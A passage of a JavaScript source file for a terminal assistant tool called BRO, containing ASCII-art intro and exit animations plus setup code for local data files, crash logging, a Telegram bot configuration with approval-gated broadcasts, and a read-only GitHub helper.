function goldShade(d){var b=[[255,215,0],[220,180,0],[180,140,0],[140,100,0]];return rgb(b[Math.min(d,3)][0],b[Math.min(d,3)][1],b[Math.min(d,3)][2]);}

var BLOCK=["\u2588","\u2593","\u2592","\u2591"];
var MCHARS="01001BUILD01BRO0110PASSION01001CRAFT101";

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// INTRO: MATRIX BUILDS "BRO"
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function matrixBuildBRO(){
  var pixels=getGothPixels("BRO");var textW=pixels[0].length;
  var startCol=Math.floor((W-textW)/2);var startRow=Math.floor(H/2)-3;
  var letterMap={};
  for(var r=0;r<7;r++)for(var c=0;c<pixels[r].length;c++)if(pixels[r][c]==="#")letterMap[(startRow+r)+","+(startCol+c)]=true;
  var drops=[];for(var x=0;x<W;x++)drops.push({y:Math.floor(Math.random()*H*-1),speed:0.6+Math.random()*1.2});
  var filled={};var total=Object.keys(letterMap).length;var count=0;
  for(var frame=0;frame<120&&count<total;frame++){
    for(var x=0;x<W;x++){
      var d=drops[x];d.y+=d.speed;var iy=Math.floor(d.y);
      if(iy>=1&&iy<=H){var key=iy+","+x;
        if(letterMap[key]&&!filled[key]){filled[key]=true;count++;at(iy,x+1);var dp=0;if(!letterMap[iy+","+(x+1)])dp=1;if(!letterMap[(iy+1)+","+x])dp=Math.max(dp,1);wr(purpleShade(dp)+BOLD+BLOCK[dp]);}
        else if(!letterMap[key]){at(iy,x+1);wr((Math.random()>0.5?greenShade(0):purpleShade(0))+MCHARS[Math.floor(Math.random()*MCHARS.length)]);}}
      for(var t=1;t<5;t++){var ty=iy-t;if(ty>=1&&ty<=H&&!filled[ty+","+x]){at(ty,x+1);wr(t<2?greenShade(t)+MCHARS[Math.floor(Math.random()*MCHARS.length)]:rgb(0,30,0)+DIM+MCHARS[Math.floor(Math.random()*MCHARS.length)]);}}
      var ey=iy-6;if(ey>=1&&ey<=H&&!filled[ey+","+x]){at(ey,x+1);wr(" ");}
      if(iy>H+8){drops[x].y=Math.floor(Math.random()*-3);drops[x].speed=0.6+Math.random()*1.2;}
    }await sleep(15);}
  for(var key in letterMap)if(!filled[key]){var pp=key.split(",");at(parseInt(pp[0]),parseInt(pp[1])+1);wr(purpleShade(0)+BOLD+BLOCK[0]);}
  for(var r=1;r<=H;r++)for(var c=0;c<W;c++)if(!letterMap[r+","+c]){at(r,c+1);wr(" ");}
  return{pixels:pixels,startRow:startRow,startCol:startCol,letterMap:letterMap};
}

async function flashBRO3D(info){
  var fns=[purpleShade,greenShade,goldShade];
  for(var ci=0;ci<3;ci++){for(var r=0;r<7;r++)for(var c=0;c<info.pixels[r].length;c++)if(info.pixels[r][c]==="#"){at(info.startRow+r,info.startCol+c+1);var dp=0;if(c+1>=info.pixels[r].length||info.pixels[r][c+1]!=="#")dp=1;if(r+1>=7||info.pixels[r+1][c]!=="#")dp=Math.max(dp,1);wr(fns[ci](dp)+BOLD+BLOCK[dp]);}await sleep(180);}
  await sleep(350);
}

async function drainReveal(ki){
  // Reveal "builderBRO" in gold, "by PASSIONCRAFT" small above
  var pcPx=getGothPixels("PASSIONCRAFT");var pcW=pcPx[0].length;var pcSC=Math.floor((W-pcW)/2);var pcSR=ki.startRow;
  var pcMap={};for(var r=0;r<7;r++)for(var c=0;c<pcPx[r].length;c++)if(pcPx[r][c]==="#")pcMap[(pcSR+r)+","+(pcSC+c)]=true;
  // "by" text above
  var fPx=getSmallPixels("by");var fW=fPx[0].length;var fSC=Math.floor((W-fW)/2);var fSR=pcSR-6;
  var fMap={};for(var r=0;r<5;r++)for(var c=0;c<fPx[r].length;c++)if(fPx[r][c]==="#")fMap[(fSR+r)+","+(fSC+c)]=true;
  var parts=[];for(var key in ki.letterMap){var pp=key.split(",");parts.push({r:parseInt(pp[0]),c:parseInt(pp[1]),vy:0.8+Math.random()*2,vx:(Math.random()-0.5)*0.7,delay:Math.floor(Math.random()*8),ch:MCHARS[Math.floor(Math.random()*MCHARS.length)],alive:true});}
  var revealed={};
  for(var frame=0;frame<40;frame++){
    for(var i=0;i<parts.length;i++){var pt=parts[i];if(!pt.alive||frame<pt.delay)continue;
      var oR=Math.round(pt.r),oC=Math.round(pt.c);
      if(oR>=1&&oR<=H&&oC>=0&&oC<W){var ok2=oR+","+oC;
        if(pcMap[ok2]&&!revealed[ok2]){revealed[ok2]=true;at(oR,oC+1);var dp=0;if(!pcMap[oR+","+(oC+1)])dp=1;if(!pcMap[(oR+1)+","+oC])dp=Math.max(dp,1);wr(goldShade(dp)+BOLD+BLOCK[dp]);}
        else if(fMap[ok2]&&!revealed["f"+ok2]){revealed["f"+ok2]=true;at(oR,oC+1);wr(rgb(140,140,160)+DIM+BLOCK[1]);}
        else if(!pcMap[ok2]&&!fMap[ok2]){at(oR,oC+1);wr(" ");}}
      pt.r+=pt.vy;pt.c+=pt.vx;pt.vy+=0.12;
      var nR=Math.round(pt.r),nC=Math.round(pt.c);
      if(nR>=1&&nR<=H&&nC>=0&&nC<W&&!pcMap[nR+","+nC]){at(nR,nC+1);wr(greenShade(Math.min(3,Math.floor((frame-pt.delay)/6)))+pt.ch);}
      if(nR>H+5)pt.alive=false;}
    if(frame>6){var pks=Object.keys(pcMap);for(var j=0;j<Math.floor(frame/2);j++){var rk=pks[Math.floor(Math.random()*pks.length)];if(!revealed[rk]){revealed[rk]=true;var pp2=rk.split(",");at(parseInt(pp2[0]),parseInt(pp2[1])+1);wr(goldShade(0)+BOLD+BLOCK[0]);}}}
    await sleep(25);}
  for(var r=1;r<=H;r++)for(var c=0;c<W;c++){var k=r+","+c;if(pcMap[k]){at(r,c+1);var dp=0;if(!pcMap[r+","+(c+1)])dp=1;if(!pcMap[(r+1)+","+c])dp=Math.max(dp,1);wr(goldShade(dp)+BOLD+BLOCK[dp]);}else if(fMap[k]){at(r,c+1);wr(rgb(140,140,160)+BLOCK[1]);}else{at(r,c+1);wr(" ");}}
  return{pcMap:pcMap,fMap:fMap,pcSR:pcSR,pcSC:pcSC,pcPx:pcPx};
}

async function goldShimmer(info){var sp=["\u2726","\u2727","\u2728","\u2736","\u2605"];var pks=Object.keys(info.pcMap);for(var f=0;f<18;f++){for(var i=0;i<10;i++){var k=pks[Math.floor(Math.random()*pks.length)];var pp=k.split(",");at(parseInt(pp[0]),parseInt(pp[1])+1);wr(Math.random()>0.5?rgb(255,255,200)+BOLD+sp[Math.floor(Math.random()*sp.length)]:goldShade(0)+BOLD+BLOCK[0]);}await sleep(50);}for(var i=0;i<pks.length;i++){var pp=pks[i].split(",");at(parseInt(pp[0]),parseInt(pp[1])+1);wr(goldShade(0)+BOLD+BLOCK[0]);}await sleep(300);var cr=info.pcSR+3,cc=Math.floor(W/2);for(var ring=0;ring<Math.max(W,H);ring+=2){var found=false;for(var i=0;i<pks.length;i++){var pp=pks[i].split(",");var pr=parseInt(pp[0]),pc=parseInt(pp[1]);var dist=Math.abs(pr-cr)+Math.abs(pc-cc);if(dist>=ring&&dist<ring+3){found=true;at(pr,pc+1);wr(rgb(220,240,255)+BOLD+sp[Math.floor(Math.random()*sp.length)]);}if(dist>=ring-4&&dist<ring-1){at(pr,pc+1);wr(rgb(255,255,255)+DIM+"\u00B7");}if(dist<ring-5){at(pr,pc+1);wr(" ");}}var fks=Object.keys(info.fMap);for(var i=0;i<fks.length;i++){var pp=fks[i].split(",");var pr=parseInt(pp[0]),pc=parseInt(pp[1]);var dist=Math.abs(pr-cr)+Math.abs(pc-cc);if(dist<ring-5){at(pr,pc+1);wr(" ");}}if(!found&&ring>20)break;await sleep(18);}await sleep(120);wr(CLR);}


// BRO MASCOT ANIMATION







// BRO MASCOT â€” Johnny Bravo style



// BRO MASCOT â€” Johnny Bravo style



// BRO MASCOT â€” Johnny Bravo style



// BRO MASCOT â€” Johnny Bravo style



async function broWalkIn(){
  // Phase 1: BRO assembles letter by letter from scattered particles
  var broPixels = getGothPixels("BRO");
  var broW = broPixels[0].length;
  var broCol = Math.floor(W/2) - Math.floor(broW/2) + 5;
  var broRow = Math.floor(H/2) - 3;
  
  // Collect all pixel positions for BRO
  var allPx = [];
  for(var r = 0; r < 7; r++){
    for(var c = 0; c < broPixels[r].length; c++){
      if(broPixels[r][c] === "#"){
        allPx.push({r: broRow + r, c: broCol + c, delay: Math.random() * 15});
      }
    }
  }
  
  // Create scattered particles â€” random positions that will fly TO the letter positions
  var particles = allPx.map(function(px){
    return {
      targetR: px.r, targetC: px.c,
      curR: px.r + (Math.random() - 0.5) * H,
      curC: px.c + (Math.random() - 0.5) * W,
      delay: px.delay,
      landed: false
    };
  });
  
  // Animate particles converging into BRO â€” 25 frames
  for(var f = 0; f <= 25; f++){
    var t = f / 25;
    var ease = t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2, 3)/2;
    
    for(var i = 0; i < particles.length; i++){
      var pt = particles[i];
      if(pt.landed) continue;
      
      // Erase old
      var oldR = Math.round(pt.curR);
      var oldC = Math.round(pt.curC);
      if(oldR >= 1 && oldR <= H && oldC >= 1 && oldC <= W){ at(oldR, oldC); wr(" "); }
      
      // Lerp toward target
      var startR = pt.targetR + (Math.random() - 0.5) * H;
      var startC = pt.targetC + (Math.random() - 0.5) * W;
      pt.curR = startR + (pt.targetR - startR) * ease;
      pt.curC = startC + (pt.targetC - startC) * ease;
      
      // Draw new
      var newR = Math.round(pt.curR);
      var newC = Math.round(pt.curC);
      if(newR >= 1 && newR <= H && newC >= 1 && newC <= W){
        at(newR, newC);
        if(f > 20){
          // Close to landing â€” show gold block
          wr(goldShade(0) + BOLD + BLOCK[0] + RST);
        } else if(f > 12){
          wr(goldShade(1) + BLOCK[1] + RST);
        } else {
          // Flying â€” show matrix char
          wr(purpleShade(Math.floor(Math.random()*3)) + MCHARS[Math.floor(Math.random()*MCHARS.length)] + RST);
        }
      }
      
      if(f === 25) pt.landed = true;
    }
    await sleep(30);
  }
  
  // Clean render BRO in solid gold 3D
  for(var r = 0; r < 7; r++){
    for(var c = 0; c < broPixels[r].length; c++){
      if(broPixels[r][c] === "#"){
        at(broRow + r, broCol + c);
        var dp = 0;
        if(c+1 >= broPixels[r].length || broPixels[r][c+1] !== "#") dp = 1;
        if(r+1 >= 7 || broPixels[r+1][c] !== "#") dp = Math.max(dp, 1);
        wr(goldShade(dp) + BOLD + BLOCK[dp] + RST);
      }
    }
  }
  
  // Gold flash pulse
  for(var pulse = 0; pulse < 3; pulse++){
    for(var r = 0; r < 7; r++){
      for(var c = 0; c < broPixels[r].length; c++){
        if(broPixels[r][c] === "#"){
          at(broRow + r, broCol + c);
          if(pulse % 2 === 0) wr(rgb(255,255,200) + BOLD + BLOCK[0] + RST);
          else wr(goldShade(0) + BOLD + BLOCK[0] + RST);
        }
      }
    }
    await sleep(120);
  }
  
  // Settle on gold
  for(var r = 0; r < 7; r++){
    for(var c = 0; c < broPixels[r].length; c++){
      if(broPixels[r][c] === "#"){
        at(broRow + r, broCol + c);
        var dp = 0;
        if(c+1 >= broPixels[r].length || broPixels[r][c+1] !== "#") dp = 1;
        if(r+1 >= 7 || broPixels[r+1][c] !== "#") dp = Math.max(dp, 1);
        wr(goldShade(dp) + BOLD + BLOCK[dp] + RST);
      }
    }
  }
  
  await sleep(400);
  
  // Phase 2: "builder" magnetically collects on the left of BRO
  // Each letter of "builder" starts as scattered dust and pulls in
  var builderText = "builder";
  var builderPixels = getSmallPixels(builderText);
  var builderW = builderPixels[0].length;
  // Position "builder" just left of BRO, vertically centered with BRO
  var builderCol = broCol - builderW - 2;
  var builderRow = broRow + 1; // offset down slightly to align with BRO middle
  if(builderCol < 1) builderCol = 1;
  
  // Collect builder pixel positions
  var bPx = [];
  for(var r = 0; r < 5; r++){
    for(var c = 0; c < builderPixels[r].length; c++){
      if(builderPixels[r][c] === "#"){
        bPx.push({r: builderRow + r, c: builderCol + c});
      }
    }
  }
  
  // Scatter builder particles â€” they start spread across the left side of screen
  var bParticles = bPx.map(function(px){
    return {
      targetR: px.r, targetC: px.c,
      curR: 1 + Math.floor(Math.random() * H),
      curC: 1 + Math.floor(Math.random() * Math.max(1, builderCol + builderW)),
      prevR: 0, prevC: 0
    };
  });
  
  // Magnetic pull â€” particles drift toward targets with increasing force
  for(var f = 0; f < 30; f++){
    var strength = 0.08 + f * 0.03; // gets stronger each frame
    
    for(var i = 0; i < bParticles.length; i++){
      var bp = bParticles[i];
      
      // Erase old
      if(bp.prevR >= 1 && bp.prevR <= H && bp.prevC >= 1 && bp.prevC <= W){
        at(bp.prevR, bp.prevC); wr(" ");
      }
      
      // Magnetic pull toward target
      var dx = bp.targetC - bp.curC;
      var dy = bp.targetR - bp.curR;
      bp.curC += dx * strength;
      bp.curR += dy * strength;
      
      // Add slight wobble for organic feel
      if(f < 20){
        bp.curC += (Math.random() - 0.5) * (2 - f * 0.1);
        bp.curR += (Math.random() - 0.5) * (1 - f * 0.05);
      }
      
      var drawR = Math.round(bp.curR);
      var drawC = Math.round(bp.curC);
      bp.prevR = drawR;
      bp.prevC = drawC;
      
      if(drawR >= 1 && drawR <= H && drawC >= 1 && drawC <= W){
        at(drawR, drawC);
        var dist = Math.abs(dx) + Math.abs(dy);
        if(dist < 2){
          // Close â€” show solid
          wr(rgb(180,180,200) + BOLD + BLOCK[0] + RST);
        } else if(dist < 8){
          wr(rgb(140,140,160) + BLOCK[1] + RST);
        } else {
          // Far â€” show dot/particle
          var dots = ["\u00B7","\u2022","\u2219"];
          wr(rgb(100,100,120) + dots[Math.floor(Math.random()*3)] + RST);
        }
      }
    }
    await sleep(35);
  }
  
  // Final clean render of "builder" in subtle silver/gray
  for(var r = 0; r < 5; r++){
    for(var c = 0; c < builderPixels[r].length; c++){
      at(builderRow + r, builderCol + c);
      if(builderPixels[r][c] === "#"){
        wr(rgb(160,160,180) + BLOCK[1] + RST);
      }
    }
  }
  
  // Quick shimmer across "builder" â€” left to right
  for(var sc = 0; sc < builderW; sc++){
    for(var r = 0; r < 5; r++){
      if(builderPixels[r][sc] === "#"){
        at(builderRow + r, builderCol + sc);
        wr(rgb(220,220,240) + BOLD + BLOCK[0] + RST);
      }
    }
    await sleep(15);
    // Dim back
    for(var r = 0; r < 5; r++){
      if(builderPixels[r][sc] === "#"){
        at(builderRow + r, builderCol + sc);
        wr(rgb(160,160,180) + BLOCK[1] + RST);
      }
    }
  }
  
  // Tagline below
  var tag = "BROs dont let BROs skip launch days";
  var tagRow2 = broRow + 9;
  if(tagRow2 > H - 1) tagRow2 = H - 1;
  var tagCol3 = Math.floor((W - tag.length) / 2);
  
  await sleep(300);
  
  for(var ti = 0; ti < tag.length; ti++){
    at(tagRow2, tagCol3 + ti);
    var tch = tag[ti];
    if(tch === "B" || tch === "R" || tch === "O"){
      wr(rgb(255,215,0) + BOLD + tch + RST);
    } else {
      wr(rgb(120,120,140) + tch + RST);
    }
    await sleep(25);
  }
  
  await sleep(500);
}

async function intro(){wr(HIDE+CLR);var ki=await matrixBuildBRO();await flashBRO3D(ki);var pi=await drainReveal(ki);await goldShimmer(pi);await broWalkIn();wr(CLR+SHOW);}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NUKE EXIT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function nukeExit(){wr(HIDE+CLR);var cx=Math.floor(W/2);var fireC=[[255,255,255],[255,255,200],[255,200,50],[255,150,0],[255,80,0],[255,30,0],[200,0,0],[120,0,0],[60,0,0]];for(var ci=0;ci<3;ci++){wr(CLR);var num=""+(3-ci);var clr=ci===2?rgb(255,0,0):rgb(255,100+ci*50,0);for(var s=0;s<3;s++){at(Math.floor(H/2),cx-1+(s%2===0?1:-1));wr(clr+BOLD+"  "+num+"  "+RST);await sleep(80);}await sleep(100);}for(var f=0;f<3;f++){for(var r=1;r<=H;r++){at(r,1);wr(bgrgb(255,255,255)+" ".repeat(W));}await sleep(50);wr(RST);for(var r=1;r<=H;r++){at(r,1);wr(" ".repeat(W));}await sleep(25);}wr(RST+CLR);await sleep(60);var groundY=H;for(var radius=1;radius<H+10;radius++){for(var angle=0;angle<360;angle+=4){var rad=angle*Math.PI/180;for(var ri=Math.max(0,radius-5);ri<=radius;ri++){var px=Math.round(cx+Math.cos(rad)*ri*1.8);var py=Math.round(groundY-Math.abs(Math.sin(rad))*ri);if(px>=1&&px<=W&&py>=1&&py<=H){at(py,px);var cIdx=Math.min(Math.floor((radius-ri)/1.2),fireC.length-1);var fc=fireC[Math.max(0,cIdx)];wr(rgb(Math.max(0,Math.min(255,fc[0]+Math.floor((Math.random()-0.5)*40))),Math.max(0,Math.min(255,fc[1]+Math.floor((Math.random()-0.5)*30))),Math.max(0,Math.min(255,fc[2]+Math.floor((Math.random()-0.5)*20))))+BLOCK[Math.floor(Math.random()*2)]);}}}await sleep(22);}var stemW=Math.floor(W*0.08);var stemLeft=cx-Math.floor(stemW/2);for(var sy=H;sy>=Math.floor(H*0.3);sy--){for(var sx=stemLeft;sx<stemLeft+stemW;sx++){if(sx<1||sx>W)continue;at(sy,sx);wr(rgb(180+Math.floor(Math.random()*60),100+Math.floor(Math.random()*40),50+Math.floor(Math.random()*30))+BLOCK[Math.abs(sx-cx)<stemW*0.3?0:1]);}if(sy%3===0&&stemW<W*0.15){stemW+=2;stemLeft=cx-Math.floor(stemW/2);}await sleep(12);}var capCY=Math.floor(H*0.25);var capRX=Math.floor(W*0.35);var capRY=Math.floor(H*0.15)+2;for(var expand=1;expand<=10;expand++){var rx=Math.floor(capRX*(expand/10));var ry=Math.floor(capRY*(expand/10));for(var fy=capCY-ry;fy<=capCY+ry;fy++)for(var fx=cx-rx;fx<=cx+rx;fx++){if(fx<1||fx>W||fy<1||fy>H)continue;var normX=(fx-cx)/rx;var normY=(fy-capCY)/ry;if(normX*normX+normY*normY<=1){at(fy,fx);var ir=180+Math.floor(Math.random()*75),ig=150+Math.floor(Math.random()*60),ib=130+Math.floor(Math.random()*50);if(normX*normX+normY*normY<0.3){ir=255;ig=200+Math.floor(Math.random()*55);ib=100+Math.floor(Math.random()*80);}wr(rgb(ir,ig,ib)+BLOCK[Math.floor(Math.random()*2)]);}}await sleep(35);}await sleep(250);for(var ring=0;ring<W;ring+=3){for(var ang=0;ang<360;ang+=5){var rad=ang*Math.PI/180;var sx2=Math.round(cx+Math.cos(rad)*ring*1.5);var sy2=Math.round(Math.floor(H*0.6)+Math.sin(rad)*ring*0.5);if(sx2>=1&&sx2<=W&&sy2>=1&&sy2<=H){at(sy2,sx2);wr(rgb(255,200+Math.floor(Math.random()*55),100+Math.floor(Math.random()*100))+"\u2022");}}await sleep(15);}await sleep(180);var ash=[];for(var i=0;i<120;i++)ash.push({r:1+Math.floor(Math.random()*3),c:1+Math.floor(Math.random()*W),vy:0.3+Math.random()*0.6,vx:(Math.random()-0.5)*0.8});var ashC=["\u2022","\u00B7","\u2591",".",","];for(var f=0;f<25;f++){for(var i=0;i<ash.length;i++){var a=ash[i];var oR=Math.round(a.r),oC=Math.round(a.c);if(oR>=1&&oR<=H&&oC>=1&&oC<=W){at(oR,oC);wr(" ");}a.r+=a.vy;a.c+=a.vx;var nR=Math.round(a.r),nC=Math.round(a.c);if(nR>=1&&nR<=H&&nC>=1&&nC<=W){at(nR,nC);var gray=60+Math.floor(Math.random()*80);wr(rgb(gray,gray-10,gray-20)+ashC[Math.floor(Math.random()*ashC.length)]);}if(a.r>H){a.r=1;a.c=1+Math.floor(Math.random()*W);}}await sleep(40);}for(var fade=0;fade<12;fade++){for(var i=0;i<Math.floor(W*H*0.12);i++){at(1+Math.floor(Math.random()*H),1+Math.floor(Math.random()*W));wr(" ");}await sleep(35);}wr(CLR);var msg="BRO HAS LEFT THE BUILDING";var msgCol=Math.floor((W-msg.length)/2);var msgRow=Math.floor(H/2);for(var i=0;i<msg.length;i++){at(msgRow,msgCol+i);var prog=i/msg.length;wr(rgb(Math.floor(255-prog*155),Math.floor(100-prog*60),Math.floor(30-prog*20))+BOLD+msg[i]);await sleep(25);}await sleep(500);for(var f=0;f<8;f++){at(msgRow,msgCol);var g=Math.max(20,200-f*25);wr(rgb(g,g,g)+msg);await sleep(55);}await sleep(200);wr(CLR+SHOW+RST);}

async function matrixRainOnly(){wr(HIDE+CLR);var drops=[];for(var x=0;x<W;x++)drops.push({y:Math.floor(Math.random()*H*-1),speed:0.4+Math.random()*1});for(var f=0;f<80;f++){for(var x=0;x<W;x++){var d=drops[x];d.y+=d.speed;var iy=Math.floor(d.y);if(iy>=1&&iy<=H){at(iy,x+1);wr((Math.random()>0.5?greenShade(0):purpleShade(0))+MCHARS[Math.floor(Math.random()*MCHARS.length)]);}for(var t=1;t<4;t++){var ty=iy-t;if(ty>=1&&ty<=H){at(ty,x+1);wr(greenShade(t)+MCHARS[Math.floor(Math.random()*MCHARS.length)]);}}var ey=iy-5;if(ey>=1&&ey<=H){at(ey,x+1);wr(" ");}if(iy>H+5){drops[x].y=Math.floor(Math.random()*-3);}}await sleep(25);}wr(CLR+SHOW);}

async function flameAnim(){wr(HIDE+CLR);var fireW=W;var buf=[];for(var i=0;i<H*fireW;i++)buf.push(0);var palette=[[0,0,0],[20,0,0],[50,0,0],[80,10,0],[120,30,0],[160,50,0],[200,80,0],[230,120,10],[255,160,30],[255,200,80],[255,230,150],[255,255,200],[255,255,255]];for(var f=0;f<60;f++){for(var x=0;x<fireW;x++)buf[(H-1)*fireW+x]=Math.random()>0.4?12:Math.floor(Math.random()*6);for(var y=1;y<H;y++)for(var x=0;x<fireW;x++){var sum=0;for(var dx=-1;dx<=1;dx++)for(var dy=0;dy<=1;dy++){var nx=Math.max(0,Math.min(fireW-1,x+dx));var ny=Math.min(H-1,y+dy);sum+=buf[ny*fireW+nx];}buf[(y-1)*fireW+x]=Math.max(0,Math.floor(sum/6)-Math.floor(Math.random()*2));}for(var y=0;y<H;y++){at(y+1,1);var line="";for(var x=0;x<Math.min(fireW,W);x++){var v=buf[y*fireW+x];var pc=palette[Math.min(v,palette.length-1)];line+=rgb(pc[0],pc[1],pc[2])+(v>8?BLOCK[0]:v>5?BLOCK[1]:v>2?BLOCK[2]:v>0?BLOCK[3]:" ");}wr(line);}await sleep(50);}wr(CLR+SHOW);}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DATA
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var HOME2=homedir();
var DATA_DIR=join(HOME2,".bro");
var LOG_F=join(DATA_DIR,"bro.log");
var SKILLS_F=join(DATA_DIR,"skills.json");
var DREAMS_F=join(DATA_DIR,"dreams.json");
var HEARTBEAT_F=join(DATA_DIR,"heartbeat.json");
var STATS_F=join(DATA_DIR,"stats.json");
try{mkdirSync(DATA_DIR,{recursive:true});}catch{}

var TOKEN=process.env.BASE44_TOKEN||"";
var APP="69d81ac3ffa24327b49b171a",CONV="69f9a8f3e048816e89717604",MAX_DEPTH=5,MAX_OUT=15000;
var GROQ_KEY=process.env.GROQ_KEY||"";
var TAVILY_KEY=process.env.TAVILY_KEY||"";
var GITHUB_TOKEN=process.env.GITHUB_TOKEN||"";
var GH_CONFIG_F=join(DATA_DIR,"github.json");
var ghConfig;try{ghConfig=JSON.parse(readFileSync(GH_CONFIG_F,"utf8"));}catch{ghConfig={defaultRepo:""};}
function saveGhConfig(){try{writeFileSync(GH_CONFIG_F,JSON.stringify(ghConfig,null,2),"utf8");}catch{}}

var CL={reset:"\x1b[0m",bold:"\x1b[1m",dim:"\x1b[2m",red:"\x1b[31m",green:"\x1b[32m",yellow:"\x1b[33m",blue:"\x1b[34m",cyan:"\x1b[36m",magenta:"\x1b[35m"};
function p(c,t){return CL[c]+t+CL.reset;}
function lg(m){try{appendFileSync(LOG_F,new Date().toISOString()+" "+m+"\n");}catch{}}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEBUG LOG + CRASH HANDLERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Previously an uncaught exception or unhandled rejection would just kill the
// process with a raw Node stack trace and nothing saved - meaning any 'random'
// crash was gone the moment the terminal scrolled. This keeps a dedicated
// record (separate from the general activity log) and, for uncaught errors
// specifically, tries to keep the process alive instead of dying silently.
var DEBUG_F=join(DATA_DIR,"debug.log");
function dbg(kind,detail){
  try{appendFileSync(DEBUG_F,"["+new Date().toISOString()+"] "+kind+": "+detail+"\n","utf8");}catch{}
}
process.on("uncaughtException", function(err){
  dbg("uncaughtException", (err&&err.stack)||String(err));
  try{ if(typeof unspin==="function") unspin(); }catch{}
  console.log("\n"+p("red","x Uncaught error (logged to ~/.bro/debug.log): ")+p("red",(err&&err.message)||String(err)));
  try{ if(typeof showPrompt==="function") showPrompt(); }catch{}
});
process.on("unhandledRejection", function(reason){
  var msg = reason instanceof Error ? reason.stack : String(reason);
  dbg("unhandledRejection", msg);
  try{ if(typeof unspin==="function") unspin(); }catch{}
  console.log("\n"+p("red","x Unhandled rejection (logged to ~/.bro/debug.log): ")+p("red",(reason&&reason.message)||String(reason)));
  try{ if(typeof showPrompt==="function") showPrompt(); }catch{}
});

var startTime=Date.now();
var stats;try{stats=JSON.parse(readFileSync(STATS_F,"utf8"));}catch{stats={totalCmds:0,toolCalls:0,apiCalls:0,errors:0,sessions:0,totalTokens:0,cmdFreq:{},firstRun:Date.now()};}
stats.sessions++;
function saveStat(){try{writeFileSync(STATS_F,JSON.stringify(stats),"utf8");}catch{}}
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•






// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var TELEGRAM_F = join(DATA_DIR, "telegram.json");
var tgConfig;
try { tgConfig = JSON.parse(readFileSync(TELEGRAM_F, "utf8")); }
catch { tgConfig = { botToken: "", chatId: "", enabled: false, pollInterval: 3000, lastUpdateId: 0, notifications: true, trustedSenders: [] }; }
if(!Array.isArray(tgConfig.trustedSenders)) tgConfig.trustedSenders = [];
function saveTgConfig() { try { writeFileSync(TELEGRAM_F, JSON.stringify(tgConfig, null, 2), "utf8"); } catch {} }

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TELEGRAM GROUPS (auto-discovered, approval-gated broadcast targets)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var TG_GROUPS_F = join(DATA_DIR, "telegram_groups.json");
var tgGroups;
try { tgGroups = JSON.parse(readFileSync(TG_GROUPS_F, "utf8")); } catch { tgGroups = {}; }
function saveTgGroups(){ try{ writeFileSync(TG_GROUPS_F, JSON.stringify(tgGroups, null, 2), "utf8"); }catch{} }
// Records/updates any non-private chat BRO's bot sees (group, supergroup, channel).
// New chats start unapproved - broadcast only ever reaches chats you've explicitly approved.
function registerTgChat(chat, memberStatus){
  if(!chat || chat.type === "private") return null;
  var id = String(chat.id);
  var existing = tgGroups[id];
  var entry = existing || { id: id, type: chat.type, title: chat.title || "(untitled)", approved: false, firstSeen: Date.now() };
  entry.type = chat.type;
  entry.title = chat.title || entry.title || "(untitled)";
  entry.lastSeen = Date.now();
  if(memberStatus) entry.memberStatus = memberStatus; // "member","administrator","left","kicked" etc.
  var isNew = !existing;
  tgGroups[id] = entry;
  saveTgGroups();
  if(isNew){
    lg("TG: discovered new "+chat.type+" \""+entry.title+"\" ("+id+") - unapproved, use /tg approve "+id+" to allow broadcasts");
    tgSend("\u{1F195} BRO was added to a new "+chat.type+": \""+entry.title+"\" (id "+id+").\nIt's unapproved - broadcasts won't reach it until you run /tg approve "+id).catch(function(){});
  }
  return entry;
}

var tgPollTimer = null;
var tgBase = "";

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// GITHUB (read-only: repo info, PRs, issues, CI checks, file contents)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function ghResolveRepo(repo){
  var r = (repo && repo.trim()) || ghConfig.defaultRepo;
  if(!r) throw new Error("No repo given and no default set. Use /gh default OWNER/REPO or pass one explicitly.");
